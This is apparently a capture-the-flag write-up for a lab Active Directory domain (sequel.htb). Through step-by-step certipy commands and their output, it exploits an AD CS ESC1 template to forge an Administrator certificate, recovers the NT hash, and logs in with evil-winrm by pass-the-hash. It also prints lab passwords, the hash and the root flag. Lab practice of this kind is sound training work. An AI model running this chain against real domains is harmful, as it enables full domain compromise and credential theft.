# Certipy

Use one of the AD accounts to enum AD CS:
```bash
certipy-ad find -u 'sql_svc' -p 'REGGIE1234ronnie' -dc-ip 10.129.228.253 -vulnerable

certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-host dc.sequel.htb -dc-ip 10.129.42.4 -vulnerable
```

There is a vulnerable template:
```bash
cat 20251202124640_Certipy.json| jq

"Certificate Templates":
[...]
      "Template Name": "UserAuthentication",
[...]
      "Enrollee Supplies Subject": true,
[...]
      "[+] User Enrollable Principals": [
        "SEQUEL.HTB\\Domain Users"
      ],
      "[!] Vulnerabilities": {
        "ESC1": "Enrollee supplies subject and template allows client authentication."
      }
[...]    
```
=> ESC1 vuln

# ESC1

Get SID of DC Administrator:
```bash
certipy-ad account -u 'sql_svc' -p 'REGGIE1234ronnie' -dc-ip 10.129.228.253 -user Administrator read

# Certipy v5.0.3 - by Oliver Lyak (ly4k)

# [*] Reading attributes for 'Administrator':
#     cn                                  : Administrator
#     distinguishedName                   : # CN=Administrator,CN=Users,DC=sequel,DC=htb
#     name                                : Administrator
#     objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
#     sAMAccountName                      : Administrator
#     userAccountControl                  : 1114624
#     whenCreated                         : 2022-11-18T17:11:51+00:00
#     whenChanged                         : 2025-12-02T17:55:36+00:00
```
=> S-1-5-21-4078382237-1492182817-2568127209-500

Request certificate for Administrator:
```bash
certipy-ad req \
    -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \
    -dc-ip 10.129.42.4 -target 'dc.sequel.htb' \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'Administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'

# Certipy v5.0.3 - by Oliver Lyak (ly4k)

# [*] Requesting certificate via RPC
# [*] Request ID is 14
# [*] Successfully requested certificate
# [*] Got certificate with UPN 'Administrator@sequel.htb'
# [*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
# [*] Saving certificate and private key to 'administrator.pfx'
# [*] Wrote certificate and private key to 'administrator.pfx'
```

Authenticate via the obtained certificate:
```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.42.4
# [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Fix: Sync time with DC:
```bash
# Disable automatic time sync
sudo timedatectl set-ntp off
# Sync with DC
sudo ntpdate -s 10.129.42.4

# Reset afterwards
sudo timedatectl set-ntp on
sudo ntpdate -s time.google.com
sudo timedatectl set-timezone Europe/Berlin
```

Try again:
```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.42.4
# [*] Certificate identities:
# [*]     SAN UPN: 'Administrator@sequel.htb'
# [*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
# [*] Using principal: 'administrator@sequel.htb'
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saving credential cache to 'administrator.ccache'
# [*] Wrote credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [-] Failed to extract NT hash: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
# [-] Use -debug to print a stacktrace
```
=> administrator.ccache
=> NTLM hash wasn rectrieved since my kali reverted the time back.

Try with chained commands:
```bash
sudo ntpdate -u dc.sequel.htb && certipy-ad auth -no-save -pfx 'administrator.pfx' -dc-ip 10.129.42.4
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
=> The date was set long enough to retrieve the NTLM hash

# Connect to DC as Admin

```bash
evil-winrm -i dc.sequel.htb -u 'sequel.htb\administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```

Flag:
```powershell
cat C:\Users\Administrator\Desktop\root.txt
# 80c24f5e3bcdfbc77ae6a6757e17f28a
```